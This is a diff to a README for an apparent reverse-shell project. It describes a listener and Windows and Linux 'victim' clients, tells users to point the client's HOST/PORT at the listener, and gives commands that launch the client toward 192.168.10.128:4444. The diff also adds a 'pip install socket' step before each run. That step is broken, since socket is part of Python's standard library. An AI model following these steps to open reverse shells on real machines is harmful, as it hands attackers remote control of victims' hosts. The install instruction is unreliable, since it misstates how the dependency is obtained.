@@ -51,8 +51,7 @@ A *reverse shell* is a technique in which a target host initiates an outbound co
 ├── listner.py             # Server-side command dispatcher (listener)
 ├── windows_reverce.py     # Example client for Windows (simulated)
 ├── linux_reverce.py       # Example client for Linux (simulated)
-├── requirements.txt       # Optional dependencies (if any)
-└── .gitignore
+
 ```
 
 > 🔧 Adjust filenames above to match your repository if they differ.
@@ -94,7 +93,7 @@ A *reverse shell* is a technique in which a target host initiates an outbound co
 
 > 🔁 **Important:** Before running any client (victim) script, you **must** update the target listener IP address (`HOST`) and, if used, the `PORT`. Failure to set the correct listener IP will cause the client to attempt to connect to the wrong host.
 
-Open the client script you intend to run (`windows_reverce.py`, `linux_reverce.py`, or `client_example.py`) and locate the `HOST`/`PORT` variables near the top of the file. Example:
+Open the client script you intend to run (`windows_reverce.py`, `linux_reverce.py`) and locate the `HOST`/`PORT` variables near the top of the file. Example:
 
 ```python
 # windows_reverce.py (example snippet)
@@ -128,15 +127,17 @@ REVERSE_HOST=192.168.10.128 REVERSE_PORT=4444 python3 windows_reverce.py
 2. Start the listener (on the host where `listner.py` runs):
 
 ```bash
+pip install socket
 python3 listner.py
 ```
 
 3. On the test client machine (after updating `HOST` to point to the listener):
 
 ```bash
-
+pip install socket
 python3 windows_reverce.py
 # or
+pip install socket
 python3 linux_reverce.py
 ```
 
